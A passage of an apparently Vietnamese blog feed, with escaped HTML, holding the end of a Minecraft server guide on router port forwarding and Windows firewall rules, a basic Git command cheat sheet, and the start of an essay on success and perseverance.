-&lt;p&gt;Đầu tiên lấy địa chỉ IP của nhà mạng bằng cách thao tác tổ hợp phím &lt;code class=&quot;highlighter-rouge&quot;&gt;start + r&lt;/code&gt; hoặc mở &lt;code class=&quot;highlighter-rouge&quot;&gt;Command Prompt&lt;/code&gt; gõ lệnh:&lt;/p&gt;
-
-&lt;div class=&quot;language-console highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;go&quot;&gt;
-	ipconfig /all
-
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;tìm đến &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Default Gateway:  192.168....&lt;/code&gt;&lt;/strong&gt; copy dòng số IP và mở trình duyệt chrome paste vào thanh địa chỉ để liên kết đến&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418IPv4.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Trường hợp bạn quên hoặc không biết &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;user&lt;/code&gt;&lt;/strong&gt; và &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;password&lt;/code&gt;&lt;/strong&gt; để truy cập vào địa &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Default Gateway&lt;/code&gt;&lt;/strong&gt;, thì bạn có thể hỏi tổng đài nhà mạng đã cấp Internet hoặc kiểm tra phần đáy của router để xem thông tin &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;user, password&lt;/code&gt;&lt;/strong&gt; để truy cập.&lt;/p&gt;
-
-&lt;p&gt;Sau khi truy cập được vào &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Default Gateway&lt;/code&gt;&lt;/strong&gt; thì làm bước sau:&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;B1:&lt;/strong&gt; : chọn &lt;code class=&quot;highlighter-rouge&quot;&gt;Firewall Setup &amp;gt; Port Forwarding&lt;/code&gt; và nhập như sau:&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418Setting1.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;
-&lt;img src=&quot;/image/2020418Setting2.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;B2:&lt;/strong&gt; Nhập thông số cho IP/Port&lt;/p&gt;
-
-&lt;blockquote&gt;
-  &lt;p&gt;&lt;strong&gt;Protocol&lt;/strong&gt;: chọn ALL &lt;br /&gt;
-&lt;strong&gt;Start Port Number&lt;/strong&gt;: &lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Port&lt;/code&gt;&lt;/em&gt; này nằm trong &lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;server.properties &amp;gt; server-port= 25565&lt;/code&gt;&lt;/em&gt; mặt định là 25565 &lt;br /&gt;
-&lt;strong&gt;End Port Number&lt;/strong&gt;: nhập giống &lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Start Port Number&lt;/code&gt;&lt;/em&gt; &lt;br /&gt;
-&lt;strong&gt;Local IP Address&lt;/strong&gt;: địa chỉ &lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IPv4 Address&lt;/code&gt;&lt;/em&gt; của bạn thao tác &lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;ipconfig /all&lt;/code&gt;&lt;/em&gt; để xem lại&lt;br /&gt;
-&lt;strong&gt;Start Port Number(Local)&lt;/strong&gt;: nhập giống &lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Start Port Number&lt;/code&gt;&lt;/em&gt; &lt;br /&gt;
-&lt;strong&gt;End Port Number(Local)&lt;/strong&gt;: nhập giống &lt;em&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Start Port Number&lt;/code&gt;&lt;/em&gt; &lt;br /&gt;&lt;/p&gt;
-&lt;/blockquote&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418Setting3.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Cuối cùng nhấp chuột vào &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;APPLY&lt;/code&gt;&lt;/strong&gt; để xác nhận hoàn thành mở port&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;B3:&lt;/strong&gt; Mở IP/Port từ &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Firewall&lt;/code&gt;&lt;/strong&gt; của máy tính&lt;/p&gt;
-
-&lt;p&gt;Tìm kiếm và mở &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Windows Defender Firewall&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418FireWall1.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Click chuột chọn &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Advanced settings&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418FireWall2.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Click chuột phải vào &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inbound Rules&lt;/code&gt;&lt;/strong&gt; và chọn &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;New Rule..&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418FireWall3.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Click chuột chọn ô &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Port&lt;/code&gt;&lt;/strong&gt; và ấn &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Next&lt;/code&gt;&lt;/strong&gt; để tiếp tục&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418FireWall4.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Click chuột chọn ô &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;TCP&lt;/code&gt;&lt;/strong&gt; và chọn &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Specific local ports&lt;/code&gt;&lt;/strong&gt; đền số port: &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;25565&lt;/code&gt;&lt;/strong&gt; và Next để tiếp tục&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418FireWall5.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Click chuột chọn ô &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Allow the connection&lt;/code&gt;&lt;/strong&gt; và Next để tiếp tục&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418FireWall6.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Next để tiếp tục&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418FireWall7.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;Nhập tên cho &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inbound Rules&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/2020418FireWall8.png&quot; alt=&quot;title-image-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;Tương tự với &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Inbound Rules&lt;/code&gt;&lt;/strong&gt; bạn cũng khởi tạo như vậy với &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Outbound Rules&lt;/code&gt;&lt;/strong&gt;&lt;br /&gt;
-Như vậy bạn đã hoàn thành khởi tạo server minecarft bạn, việc bây giờ là bạn chỉ cần chia sẻ địa chỉ IP/Port cho bạn bè cùng vào chơi.&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;p&gt;IP: chính là IPv4 của bạn&lt;br /&gt;
-Port: chính là server-port= 25565 của bạn&lt;/p&gt;
-
-&lt;p&gt;IP:Port ví dụ: 192.168.55.103:25565&lt;/p&gt;
-
-&lt;p&gt;Chúc các bạn thành công !&lt;/p&gt;
-
-&lt;hr /&gt;</content><author><name>Panadora</name></author><category term="[&quot;games&quot;, &quot;news&quot;]" /><summary type="html">Tiếp tục với phần 2 của Hướng dẫn tạo server minecarft</summary></entry><entry><title type="html">Các lệnh GIT cơ bản (P1)</title><link href="http://localhost:4000/git-co-ban-p1" rel="alternate" type="text/html" title="Các lệnh GIT cơ bản (P1)" /><published>2020-04-16T00:00:00+07:00</published><updated>2020-04-16T00:00:00+07:00</updated><id>http://localhost:4000/git-co-ban-p1</id><content type="html" xml:base="http://localhost:4000/git-co-ban-p1">&lt;p&gt;Khi đã là một lập trình viên thì &lt;strong&gt;GIT&lt;/strong&gt; là một công cụ không thể thiếu, nếu bạn không biết &lt;strong&gt;GIT&lt;/strong&gt; là gì?, vì sao sử dụng &lt;strong&gt;GIT&lt;/strong&gt; trong project? thì mình sẽ giải thích ngắn gọn như sau.&lt;br /&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;GIT&lt;/code&gt; là một hệ thông quản lý phiên bản phân tán &lt;code class=&quot;highlighter-rouge&quot;&gt;(VCS - distributed Version Control System)&lt;/code&gt;, là một công cụ lập trình hỗ trợ quản lý code, ghi lại lịch sử thay đổi cũng như phân nhánh (branch), chia nhiệm vụ, và tổng hợp code một cách dễ dàng hơn.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/GIT.jpg&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;git&quot;&gt;&lt;kbd&gt;GIT&lt;/kbd&gt;&lt;/h3&gt;
-&lt;p&gt;&lt;strong&gt;Sau đây là những lệnh &lt;code class=&quot;highlighter-rouge&quot;&gt;GIT&lt;/code&gt; cơ bản.&lt;/strong&gt;&lt;/p&gt;
-&lt;h5 id=&quot;git-gui&quot;&gt;GIT GUI&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;gitk&lt;/code&gt; : Thao tác git dưới dạng giao diện trực quan&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;cấu-hình-git&quot;&gt;Cấu hình GIT&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git config --global user.name = &quot;&amp;lt;user name&amp;gt;&quot;&lt;/code&gt;&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git config --global user.email = &quot;&amp;lt;email@.com&amp;gt;&quot;&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;thời-gian-đăng-nhập-và-bảo-mật&quot;&gt;Thời gian đăng nhập và bảo mật&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git config --global credential.helper store&lt;/code&gt; : Tạo một file ~/.git-credentials và lưu tài khoảng dưới dạng text, bảo mật không an toàn&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git config --global credential.helper &quot;cache --timeout=18000&quot;&lt;/code&gt; : Tự động đăng xuất sau 5 tiếng&lt;/li&gt;
-  &lt;li&gt;&lt;a href=&quot;https://inchoo.net/dev-talk/how-to-generate-ssh-keys-for-git-authorization/&quot;&gt;Sử dụng git ssh&lt;/a&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;thao-tác-đẩy-lần-đầu&quot;&gt;Thao tác đẩy lần đầu&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git init&lt;/code&gt; : Tạo 1 file .git&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git status&lt;/code&gt; : Xem trạng thái thay đổi&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git add &quot; &amp;lt;file.name&amp;gt; &quot;&lt;/code&gt; : Chỉ định từng file sẽ được thêm&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git add .&lt;/code&gt; : Chỉ định tất cả các file sẽ được thêm&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git commit -m&quot; &amp;lt;comment code&amp;gt; &quot;&lt;/code&gt; : Ghi chú trước khi push lên&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git remote add origin https://github.com/...&lt;/code&gt; : Tạo liên kết tới Repository github&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git remote -v&lt;/code&gt; : Xem lại và đỉnh đốn đường dẫn nếu remote sai&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git push -u origin master&lt;/code&gt; : Đẩy lên github&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;thao-tác-theo-dõi-tiến-trình&quot;&gt;Thao tác theo dõi tiến trình&lt;/h5&gt;
-
-&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Ấn 'Q' để thoát tiến trình command&lt;/code&gt;&lt;/p&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git log&lt;/code&gt; : Xem lại lịch sử quá trình commit, xuất mã [id.commit]&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git show &amp;lt;id.commit&amp;gt;&lt;/code&gt; : Xem chi tiết tất cả thay đổi từ [git log]&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git diff&lt;/code&gt; : Xem lại các thay đổi từ [git status], chưa [git add]&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;thao-tác-xử-lý-vấn-đề&quot;&gt;Thao tác xử lý vấn đề&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-&amp;gt;&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;git remote&lt;/code&gt; : Hiển thị tên remote chỉ định&lt;/li&gt;
-  &lt;li&gt;
-    &lt;table&gt;
-      &lt;tbody&gt;
-        &lt;tr&gt;
-          &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git checkout -- &amp;lt;file.name&amp;gt;&lt;/code&gt; : Xoá bỏ tất cả những thay đổi trước đó khi chưa [git add]&lt;/td&gt;
-          &lt;td&gt;{*RED}&lt;/td&gt;
-        &lt;/tr&gt;
-      &lt;/tbody&gt;
-    &lt;/table&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;table&gt;
-      &lt;tbody&gt;
-        &lt;tr&gt;
-          &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git reset HEAD &amp;lt;file.name&amp;gt;&lt;/code&gt; : Quay lại quá trình khi lỡ [git add .] 1 file nào đó&lt;/td&gt;
-          &lt;td&gt;{*GREEN}&lt;/td&gt;
-        &lt;/tr&gt;
-      &lt;/tbody&gt;
-    &lt;/table&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git remote set-url origin &amp;lt;name.branch&amp;gt;&lt;/code&gt; : Sửa đổi liên kết Repository github&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;thao-tác-nhánh&quot;&gt;Thao tác nhánh&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git branch&lt;/code&gt; : Kiểm tra nhánh&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git checkout -b &amp;lt;name&amp;gt;&lt;/code&gt; : Tạo nhánh&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git checkout &amp;lt;name&amp;gt;&lt;/code&gt; : Chuyển nhánh&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;-:&amp;gt;&amp;gt; B -&amp;gt; A&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;-:&amp;gt;&amp;gt;&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;git checkout &amp;lt;A&amp;gt;&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;-:&amp;gt;&amp;gt;&lt;/code&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;git merge &amp;lt;B&amp;gt;&lt;/code&gt; : Gộp nhánh&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git branch -D &amp;lt;name&amp;gt;&lt;/code&gt; : Xoá 1 nhánh&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;thao-tác-hoàn-trả-commit&quot;&gt;Thao tác hoàn trả commit&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;table&gt;
-      &lt;tbody&gt;
-        &lt;tr&gt;
-          &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git reset --soft &amp;lt;id.commit&amp;gt;&lt;/code&gt; : Quay về commit chỉ định đã [git add] và chỉnh sửa commit&lt;/td&gt;
-          &lt;td&gt;{*GREEN}&lt;/td&gt;
-        &lt;/tr&gt;
-      &lt;/tbody&gt;
-    &lt;/table&gt;
-  &lt;/li&gt;
-  &lt;li&gt;
-    &lt;table&gt;
-      &lt;tbody&gt;
-        &lt;tr&gt;
-          &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git reset --mixed &amp;lt;id.commit&lt;/code&gt; : Quay về commit chỉ định chưa [git add] và thay đổi commit sau khi add&lt;/td&gt;
-          &lt;td&gt;{*RED}&lt;/td&gt;
-        &lt;/tr&gt;
-      &lt;/tbody&gt;
-    &lt;/table&gt;
-  &lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git reset --hard &amp;lt;id.commit&amp;gt;&lt;/code&gt; : Xoá hẵn tiến trình commit đã chỉ định (NGUY HIỂM)&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git revert &amp;lt;id.commit&amp;gt;&lt;/code&gt; : Chỉ định 1 commit chỉ định và xoá đi những mã nguồn trước đó của một commit, không ảnh hưởng đến các commit nằm trước đó, ảnh hưởng các commit phía dưới (NGUY HIỂM, hạn chế dùng)&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;thao-tác-từ-chối&quot;&gt;Thao tác từ chối&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;copy nul &amp;lt;.gitignore&amp;gt;&lt;/code&gt; : Tạo 1 file .gitignore, từ chối push lên github khi chỉ định 1 folder hoặc file&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h5 id=&quot;thao-tác-kéo-về&quot;&gt;Thao tác kéo về&lt;/h5&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git clone &amp;lt;Clone with HTTPS/SSH&amp;gt;&lt;/code&gt; : Lấy Repositories về từ github&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git pull&lt;/code&gt; : Cập nhật thay đổi trên Repositories&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git pull &amp;lt;name.remote&amp;gt; &amp;lt;name.branch&amp;gt;&lt;/code&gt; : Cập nhật thay đổi từ các nhánh khác về nhánh chỉ định và merge các sự thay đổi&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git fetch &amp;lt;name.remote&amp;gt; &amp;lt;name.branch&amp;gt;&lt;/code&gt; : Giống như (git pull &lt;n.r&gt; &lt;n.b&gt;) chỉ khác nhau là không merge&lt;/n.b&gt;&lt;/n.r&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;h4 id=&quot;thao-tác-lỗi&quot;&gt;Thao tác lỗi&lt;/h4&gt;
-&lt;ul&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git push origin master -f&lt;/code&gt; : Quên pull về, khi push lên thông báo lỗi, nếu pull về sẽ mất đi thay đổi trước đó trên local, nhưng push lên thì sẽ mất đi thay đổi trên server. Lệnh này ép pull đi và push tahy đổi lên. (NGUY HIỂM, nên kiểm tra lại project trước khi bắt đầu công việc)&lt;/li&gt;
-  &lt;li&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;git add -A&lt;/code&gt; : (&lt;strong&gt;error: failed to push some refs to&lt;/strong&gt;) xuất hiện khi nhập lệnh &lt;code class=&quot;highlighter-rouge&quot;&gt;git push&lt;/code&gt; thất bại. Nên bắt đầu lại từ đoạn &lt;em&gt;git add .&lt;/em&gt; =&amp;gt; &lt;em&gt;git add -A&lt;/em&gt;&lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-&lt;hr /&gt;
-
-&lt;h3 id=&quot;các-câu-hỏi-trong-git&quot;&gt;&lt;center&gt;Các câu hỏi trong GIT&lt;/center&gt;&lt;/h3&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;h5 id=&quot;câu-hỏi-git-add--và-git-add--khác-nhau-như-thế-nào&quot;&gt;&lt;strong&gt;Câu hỏi:&lt;/strong&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;git add *&lt;/code&gt; và &lt;code class=&quot;highlighter-rouge&quot;&gt;git add .&lt;/code&gt; khác nhau như thế nào?&lt;/h5&gt;
-
-    &lt;p&gt;&lt;strong&gt;Trả lời:&lt;/strong&gt;&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;-Thực sự  &lt;code class=&quot;highlighter-rouge&quot;&gt;git add *&lt;/code&gt; được quy định bên trong &lt;em&gt;SELL&lt;/em&gt; của hệ điều hành, ý nghĩa bao hàm tất cả thư mục hiện tại đều chuyển tới &lt;em&gt;.git&lt;/em&gt;, dấu &lt;code class=&quot;highlighter-rouge&quot;&gt;*&lt;/code&gt; mang ý nghĩa là &lt;strong&gt;bao gồm&lt;/strong&gt;, ( lưu ý rằng các file bắt đầu bởi dấu &lt;strong&gt;.&lt;/strong&gt; đều không thêm vào).&lt;/li&gt;
-      &lt;li&gt;-&lt;code class=&quot;highlighter-rouge&quot;&gt;git add .&lt;/code&gt; được sử dụng bao gồm tất cả các file bao gồm file bắt đầu bằng dấu &lt;strong&gt;.&lt;/strong&gt; hiện tại đều chuyển tới &lt;em&gt;.git&lt;/em&gt;&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;h5 id=&quot;câu-hỏi-sự-khác-nhau-giữa-git-add--git-add--u-và-git-add--a-&quot;&gt;&lt;strong&gt;Câu hỏi:&lt;/strong&gt; Sự khác nhau giữa &lt;code class=&quot;highlighter-rouge&quot;&gt;git add .&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;git add -u&lt;/code&gt; và &lt;code class=&quot;highlighter-rouge&quot;&gt;git add -A&lt;/code&gt;, ?&lt;/h5&gt;
-
-    &lt;p&gt;&lt;strong&gt;Trả lời:&lt;/strong&gt;&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;-&lt;code class=&quot;highlighter-rouge&quot;&gt;git add .&lt;/code&gt; : Chỉ thêm các file mới và những file đã sửa đổi bao gồm cả thuộc tính file, không theo dõi các file đã bị xoá.&lt;/li&gt;
-      &lt;li&gt;-&lt;code class=&quot;highlighter-rouge&quot;&gt;git add -u&lt;/code&gt; : Sẽ không thêm bất kỳ file mới nào, chỉ thêm các file đã sửa đổi khi được theo dõi trước đó bao gồm cã thuộc tính và loại bỏ những file đã bị xoá.&lt;/li&gt;
-      &lt;li&gt;-&lt;code class=&quot;highlighter-rouge&quot;&gt;git add -A&lt;/code&gt; : Là sự kết hợp giữa &lt;code class=&quot;highlighter-rouge&quot;&gt;git add .&lt;/code&gt; và &lt;code class=&quot;highlighter-rouge&quot;&gt;git add -u&lt;/code&gt;, bao gồm thêm file mới, thuộc tính file và loại bỏ những file đã xoá.&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;
-
-&lt;hr /&gt;
-
-&lt;ul&gt;
-  &lt;li&gt;
-    &lt;h5 id=&quot;câu-hỏi-sau-khi-clone-repositories-từ-github-về-tôi-không-thể-liệt-kê-được-branch-ngay-trên-local&quot;&gt;&lt;strong&gt;Câu hỏi:&lt;/strong&gt; Sau khi clone repositories từ github về, tôi không thể liệt kê được &lt;strong&gt;branch&lt;/strong&gt; ngay trên local.&lt;/h5&gt;
-
-    &lt;p&gt;&lt;strong&gt;Trả lời:&lt;/strong&gt;&lt;/p&gt;
-
-    &lt;ul&gt;
-      &lt;li&gt;-&lt;code class=&quot;highlighter-rouge&quot;&gt;git branch -a&lt;/code&gt; : Giúp liệt kê tất cả cách nhánh từ phía server.&lt;/li&gt;
-      &lt;li&gt;-&lt;code class=&quot;highlighter-rouge&quot;&gt;git checkout &amp;lt;name-branch&amp;gt;&lt;/code&gt; : Chọn nhánh.&lt;/li&gt;
-      &lt;li&gt;-&lt;code class=&quot;highlighter-rouge&quot;&gt;git pull origin &amp;lt;master&amp;gt;&lt;/code&gt; : Cập nhật thay đổi từ nhánh &lt;strong&gt;master&lt;/strong&gt;.&lt;/li&gt;
-    &lt;/ul&gt;
-  &lt;/li&gt;
-&lt;/ul&gt;</content><author><name>Trần Đức Lĩnh</name></author><category term="[&quot;windows&quot;, &quot;unixlinux. terminal&quot;]" /><summary type="html">Khi đã là một lập trình viên thì GIT là một công cụ không thể thiếu, nếu bạn không biết GIT là gì?</summary></entry><entry><title type="html">Thành công và sự kiên trì</title><link href="http://localhost:4000/thanh-cong-va-su-kien-tri" rel="alternate" type="text/html" title="Thành công và sự kiên trì" /><published>2020-04-16T00:00:00+07:00</published><updated>2020-04-16T00:00:00+07:00</updated><id>http://localhost:4000/thanh-cong-va-su-kien-tri</id><content type="html" xml:base="http://localhost:4000/thanh-cong-va-su-kien-tri">&lt;p&gt;Hãy nắm vững những phương pháp làm việc hiệu quả so với việc bạn cứ cắm đầu vào và làm việc như một cái máy. Đầu óc trống rỗng không có chút tư duy, thật sự mà nói người tài giỏi đều chiến thẳng chính là nhờ có tư duy.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/image/thanh-cong-va-su-kien-tri.jpg&quot; alt=&quot;image-title-here&quot; width=&quot;100%&quot; /&gt;&lt;/p&gt;
-
-&lt;h4 id=&quot;có-một-câu-chuyện-như-sau&quot;&gt;Có một câu chuyện như sau:&lt;/h4&gt;
-&lt;p&gt;&lt;strong&gt;Nhân viên:&lt;/strong&gt; -Tôi đã làm việc được 10 năm kinh nghiệm rồi, tại sao sếp lại không tăng lương cho tôi?&lt;br /&gt;
-&lt;strong&gt;Sếp:&lt;/strong&gt; -Cái tôi đang cần không phải 10 năm kinh nghiệm làm việc, mà là anh đem 1 năm kinh nghiệm dùng tới 10 năm.&lt;/p&gt;
-
-&lt;p&gt;&lt;em&gt;Thật sự mà nói những phương pháp hiệu quả cao quý hơn nhiều so với việc phải cắm đầu vào làm như một cái máy mà không có chút tư duy nào trong đó.&lt;/em&gt;&lt;/p&gt;
-
-&lt;h3 id=&quot;1-định-luật-sao-lưu&quot;&gt;1) Định luật sao lưu.&lt;/h3&gt;
-&lt;p&gt;Đa số những lập trình viên đều có 1 bản sao lưu dữ liệu quan trọng, đề phòng khi ổ cứng có vấn đề, mất hết code, mọi công sức bỏ ra đều vô nghĩa.&lt;/p&gt;
-
-&lt;p&gt;Sao lưu ở đây là một sự chuẩn bị khác.&lt;/p&gt;
-
-&lt;p&gt;&lt;small&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Hãy học cách cắt móng tay bằng tay trái, bởi tay phải của bạn không thể lúc nào cũng làm việc.&lt;/code&gt;&lt;/small&gt;&lt;/p&gt;
-
-&lt;p&gt;&lt;strong&gt;Đây chính là định luật sao lưu:&lt;/strong&gt; một người có tư duy rõ ràng, mọi thứ đều phải có sự chuẩn bị, đừng bao giờ nước đến chân mới nhảy.&lt;/p&gt;
-
